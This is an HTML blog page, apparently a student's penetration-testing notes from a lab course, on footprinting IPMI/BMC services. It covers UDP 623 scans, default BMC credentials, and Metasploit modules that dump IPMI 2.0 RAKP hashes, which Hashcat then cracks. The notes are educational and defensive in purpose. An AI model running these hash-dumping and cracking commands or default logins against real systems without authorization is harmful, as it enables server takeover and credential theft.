@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Google Analytics (gtag.js) - counts your visitors -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-V2R1YY0P62"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-V2R1YY0P62');
+  </script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Footprinting IPMI · Aymane Elouafi</title>
+  <meta name="description" content="What IPMI/BMCs are, scanning UDP 623 with Nmap and Metasploit, default BMC credentials, and dumping + cracking IPMI 2.0 RAKP password hashes with Hashcat.">
+  <meta name="author" content="Aymane Elouafi">
+  <meta name="robots" content="index, follow, max-image-preview:large">
+  <meta name="google-site-verification" content="P6WC3YGSehH9r2o-Lon_-tKZGpFiOWJjHD41vtJqLsk">
+  <link rel="canonical" href="https://aymaneelouafi.me/ipmi.html">
+  <link rel="icon" href="/favicon.ico" sizes="48x48">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="/favicon-512.png" type="image/png" sizes="512x512">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+  <!-- Open Graph (Facebook, LinkedIn, Discord...) -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Footprinting IPMI · Aymane Elouafi">
+  <meta property="og:description" content="What IPMI/BMCs are, scanning UDP 623 with Nmap and Metasploit, default BMC credentials, and dumping + cracking IPMI 2.0 RAKP password hashes with Hashcat.">
+  <meta property="og:url" content="https://aymaneelouafi.me/ipmi.html">
+  <meta property="og:site_name" content="Aymane Elouafi">
+  <meta property="og:image" content="https://aymaneelouafi.me/images/og.png">
+
+  <!-- Twitter / X -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Footprinting IPMI · Aymane Elouafi">
+  <meta name="twitter:description" content="What IPMI/BMCs are, scanning UDP 623 with Nmap and Metasploit, default BMC credentials, and dumping + cracking IPMI 2.0 RAKP password hashes with Hashcat.">
+  <meta name="twitter:image" content="https://aymaneelouafi.me/images/og.png">
+
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "headline": "Footprinting IPMI",
+      "description": "What IPMI/BMCs are, scanning UDP 623 with Nmap and Metasploit, default BMC credentials, and dumping + cracking IPMI 2.0 RAKP password hashes with Hashcat.",
+      "datePublished": "2026-10-28",
+      "dateModified": "2026-10-28",
+      "author": {
+        "@type": "Person",
+        "name": "Aymane Elouafi",
+        "@id": "https://aymaneelouafi.me/#person",
+        "url": "https://aymaneelouafi.me"
+      },
+      "publisher": {
+        "@type": "Person",
+        "name": "Aymane Elouafi",
+        "url": "https://aymaneelouafi.me"
+      },
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://aymaneelouafi.me/ipmi.html"
+      },
+      "url": "https://aymaneelouafi.me/ipmi.html",
+      "image": "https://aymaneelouafi.me/images/og.png",
+      "keywords": "htb, footprinting, ipmi, bmc, ilo, idrac, hashcat, enumeration",
+      "articleSection": "Footprinting Services",
+      "inLanguage": "en"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Aymane Elouafi",
+          "item": "https://aymaneelouafi.me/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Footprinting Services"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Footprinting IPMI",
+          "item": "https://aymaneelouafi.me/ipmi.html"
+        }
+      ]
+    }
+  ]
+}
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/style.css?v=1793197544199">
+  <script defer src="/menu.js?v=1793197544199"></script>
+</head>
+<body>
+  <div class="topbar">
+    <button class="menu-toggle" aria-label="Open menu" aria-expanded="false">☰ menu</button>
+    <a class="topbar-home" href="/">~/aymane</a>
+  </div>
+  <div class="backdrop" id="backdrop"></div>
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-inner">
+      <p class="sidebar-title">// methodology &amp; notes</p>
+    <details class="nav-phase" open>
+      <summary><span class="nav-num">1</span> Information Gathering</summary>
+        <div class="nav-section">
+          <span class="nav-sec-title">Host Discovery &amp; Port Scanning</span>
+          <ul>
+            <li><a href="nmap.html">Network Enumeration with Nmap</a></li>
+          </ul>
+        </div>
+        <div class="nav-section">
+          <span class="nav-sec-title">Service Enumeration / Footprinting</span>
+          <ul>
+            <li><a href="nfs.html">Footprinting NFS</a></li>
+            <li><a href="ftp.html">Footprinting FTP</a></li>
+            <li><a href="dns.html">Footprinting DNS</a></li>
+            <li><a href="smtp.html">Footprinting SMTP</a></li>
+            <li><a href="imap-pop3.html">Footprinting IMAP / POP3</a></li>
+            <li><a href="snmp.html">Footprinting SNMP</a></li>
+            <li><a href="mysql.html">Footprinting MySQL</a></li>
+            <li><a href="mssql.html">Footprinting MSSQL</a></li>
+            <li><a href="oracle-tns.html">Footprinting Oracle TNS</a></li>
+            <li><a href="ipmi.html" class="current">Footprinting IPMI</a></li>
+          </ul>
+        </div>
+        <div class="nav-section empty"><span class="nav-sec-title">Web Recon</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">2</span> Vulnerability Assessment</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Known Vulnerabilities (version → CVE)</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Web Vulnerabilities</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Misconfigurations &amp; Default Credentials</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">3</span> Exploitation</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Service / Network Exploitation</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Web Exploitation</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Password Attacks</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">4</span> Post-Exploitation</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Local Enumeration</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Privilege Escalation (Linux / Windows)</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Looting &amp; Credential Hunting</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">5</span> Lateral Movement</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Pivoting &amp; Tunneling</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Credential Reuse &amp; Pass-the-Hash</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">6</span> Active Directory</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">AD Enumeration</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">AD Attacks</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Domain Dominance &amp; Lateral Movement</span></div>
+    </details>
+    <details class="nav-phase nav-walk">
+      <summary><span class="nav-num">★</span> HTB Walkthroughs</summary>
+      <div class="nav-section">
+        <ul>
+          <li><a href="cap.html">Cap - HTB Walkthrough</a></li>
+        </ul>
+      </div>
+    </details>
+    </div>
+  </aside>
+  <main class="container post">
+
+    <a class="back" href="/">← cd ..</a>
+
+    <span class="series-label">Footprinting Services</span>
+    <h1>Footprinting IPMI</h1>
+    <p class="post-meta">2026-10-28 · #htb #footprinting #ipmi #bmc #ilo #idrac #hashcat #enumeration</p>
+
+    <input id="post-search" class="search post-search" type="text"
+           placeholder="search in this post...  (Enter = next, Shift+Enter = previous, Esc = clear)"
+           autocomplete="off">
+    <p id="post-search-count" class="search-count" hidden></p>
+
+  <details class="cheatsheet">
+    <summary><span class="arrow">&#9656;</span> Cheat sheet &mdash; useful commands</summary>
+    <div class="cheat-body">
+      <div class="cheat-row">
+        <code>nmap -sU --script ipmi-version -p 623 &lt;target&gt;</code>
+        <span>Fingerprint IPMI version</span>
+      </div>
+      <div class="cheat-row">
+        <code>msf&gt; use auxiliary/scanner/ipmi/ipmi_version</code>
+        <span>Metasploit IPMI version scan</span>
+      </div>
+      <div class="cheat-row">
+        <code>msf&gt; use auxiliary/scanner/ipmi/ipmi_dumphashes</code>
+        <span>Dump IPMI 2.0 RAKP password hashes</span>
+      </div>
+      <div class="cheat-row">
+        <code>hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt</code>
+        <span>Crack IPMI hashes offline</span>
+      </div>
+      <div class="cheat-row">
+        <code>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</code>
+        <span>HP iLO default 8-char mask attack</span>
+      </div>
+    </div>
+  </details>
+
+
+
+    <article id="content">
+<p><strong>What IPMI is</strong></p>
+<ul>
+<li><strong>IPMI (Intelligent Platform Management Interface)</strong> = a standardized set of specs for <strong>hardware-based host management</strong> (managing/monitoring systems).</li>
+<li>Runs as an <strong>autonomous subsystem</strong>, independent of the host&#39;s BIOS, CPU, firmware, and operating system.</li>
+<li>Lets sysadmins manage/monitor a system <strong>even when it&#39;s powered off or unresponsive</strong>.</li>
+<li>Works over a <strong>direct network connection to the hardware</strong> — no OS login/shell needed.</li>
+<li>Can do <strong>remote upgrades</strong> without physical access to the host.</li>
+</ul>
+<p><strong>Typical uses (3 main ones)</strong></p>
+<ul>
+<li>Before the OS boots → modify <strong>BIOS settings</strong>.</li>
+<li>When the host is <strong>fully powered down</strong>.</li>
+<li>Accessing a host <strong>after a system failure</strong>.</li>
+</ul>
+<p><strong>What it monitors when not doing the above</strong></p>
+<ul>
+<li>System temperature, voltage, fan status, power supplies.</li>
+<li>Querying inventory info, reviewing hardware logs.</li>
+<li>Alerting via <strong>SNMP</strong>.</li>
+</ul>
+<p><strong>Power/connection requirement</strong></p>
+<ul>
+<li>The host can be off, but the <strong>IPMI module itself needs a power source and a LAN connection</strong> to work.</li>
+</ul>
+<p><strong>Background</strong></p>
+<ul>
+<li>First published by <strong>Intel in 1998</strong>; now supported by <strong>200+ vendors</strong> (Cisco, Dell, HP, Supermicro, Intel, etc.).</li>
+<li><strong>IPMI version 2.0</strong> supports administration via <strong>serial over LAN</strong> (view serial console output in-band).</li>
+</ul>
+<p><strong>Required components</strong></p>
+<ul>
+<li><strong>BMC (Baseboard Management Controller)</strong> — the micro-controller; the essential core of IPMI.</li>
+<li><strong>ICMB (Intelligent Chassis Management Bus)</strong> — interface for communication <strong>between chassis</strong>.</li>
+<li><strong>IPMB (Intelligent Platform Management Bus)</strong> — <strong>extends</strong> the BMC.</li>
+<li><strong>IPMI Memory</strong> — stores the system event log, repository store data, etc.</li>
+<li><strong>Communications Interfaces</strong> — local system interfaces, serial &amp; LAN interfaces, ICMB, and PCI Management Bus.</li>
+</ul>
+<h2>Footprinting the Service</h2>
+<p>IPMI communicates over port <strong>623 UDP</strong>. Systems that use the IPMI protocol are called <strong>Baseboard Management Controllers (BMCs)</strong>. BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host&#39;s motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol. Below is a sample Nmap scan using the Nmap <a href="https://nmap.org/nsedoc/scripts/ipmi-version.html">ipmi-version</a> NSE script to footprint the service.</p>
+<h3>Nmap</h3>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
+Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
+Host is up (0.00064s latency).
+
+PORT    STATE SERVICE
+623/udp open  asf-rmcp
+| ipmi-version:
+|   Version:
+|     IPMI-2.0
+|   UserAuth:
+|   PassAuth: auth_user, non_null_user
+|_  Level: 2.0
+MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
+</code></pre>
+<p>Here, we can see that the IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol. We can also use the Metasploit scanner module <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/">IPMI Information Discovery</a> (<code>auxiliary/scanner/ipmi/ipmi_version</code>).</p>
+<h3>Metasploit Version Scan</h3>
+<pre><code class="language-shell">msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version 
+msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options 
+
+Module options (auxiliary/scanner/ipmi/ipmi_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   BATCHSIZE  256              yes       The number of hosts to probe in each set
+   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT      623              yes       The target port (UDP)
+   THREADS    10               yes       The number of concurrent threads
+
+
+msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run
+
+[*] Sending IPMI requests to 10.129.42.195-&gt;10.129.42.195 (1 hosts)
+[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+<p>During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:</p>
+<table>
+<thead>
+<tr>
+<th>Product</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Dell iDRAC</td>
+<td>root</td>
+<td>calvin</td>
+</tr>
+<tr>
+<td>HP iLO</td>
+<td>Administrator</td>
+<td>randomized 8-character string consisting of numbers and uppercase letters</td>
+</tr>
+<tr>
+<td>Supermicro IPMI</td>
+<td>ADMIN</td>
+<td>ADMIN</td>
+</tr>
+</tbody></table>
+<p>It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.</p>
+<h2>Dangerous Settings</h2>
+<p>If default credentials do not work to access a BMC, we can turn to a <a href="https://web.archive.org/web/20260421071724/http://fish2.com/ipmi/remote-pw-cracking.html">flaw</a> in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user&#39;s password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using <code>Hashcat</code> mode <code>7300</code>. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command <code>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</code> which tries all combinations of upper case letters and numbers for an eight-character password.</p>
+<pre><code class="language-shell">┌─[aymane@parrot]─[~]
+└──╼ $hashcat -m 7300 b20a936282050000992f4911d3567c4123e46c4bf5d2cc9e2fcbbb81974a4d9369e373925e41a065a123456789abcdefa123456789abcdef140561646d696e:e5d4c37005757f9ee9722a07f5c508d8f34b8848 /usr/share/wordlists/rockyou.txt
+
+[...]
+
+b20a936282050000992f4911d3567c4123e46c4bf5d2cc9e2fcbbb81974a4d9369e373925e41a065a123456789abcdefa123456789abcdef140561646d696e:e5d4c37005757f9ee9722a07f5c508d8f34b8848:trinity
+</code></pre>
+<p>There is no direct &quot;fix&quot; to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.</p>
+<p>To retrieve IPMI hashes, we can use the Metasploit <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/">IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval</a> module.</p>
+<h3>Metasploit Dumping Hashes</h3>
+<pre><code class="language-shell">msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes 
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; show options 
+
+Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
+
+   Name                 Current Setting                                                    Required  Description
+   ----                 ---------------                                                    --------  -----------
+   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
+   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
+   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
+   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
+   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT                623                                                                yes       The target port
+   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
+   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
+
+
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run
+
+[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
+[+] 10.129.42.195:623 - IPMI - Hash for user &#39;ADMIN&#39; matches password &#39;ADMIN&#39;
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+<blockquote>
+<p>Experimenting with different word lists is crucial for obtaining the password from the acquired hash.</p>
+</blockquote>
+<p>Here we can see that we have successfully obtained the password hash for the user <code>ADMIN</code>, and the tool was able to quickly crack it to reveal what appears to be a default password <code>ADMIN</code>. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.</p>
+
+    </article>
+
+  <nav class="series">
+    <p class="prompt">$ ls ~/series/footprinting-services</p>
+    <ul>
+      <li><a href="nfs.html">Footprinting NFS</a></li>
+      <li><a href="ftp.html">Footprinting FTP</a></li>
+      <li><a href="dns.html">Footprinting DNS</a></li>
+      <li><a href="smtp.html">Footprinting SMTP</a></li>
+      <li><a href="imap-pop3.html">Footprinting IMAP / POP3</a></li>
+      <li><a href="snmp.html">Footprinting SNMP</a></li>
+      <li><a href="mysql.html">Footprinting MySQL</a></li>
+      <li><a href="mssql.html">Footprinting MSSQL</a></li>
+      <li><a href="oracle-tns.html">Footprinting Oracle TNS</a></li>
+      <li class="current">Footprinting IPMI &lt;- you are here</li>
+    </ul>
+  </nav>
+
+  </main>
+
+  <script src="/post.js?v=1793197544199"></script>
+</body>
+</html>
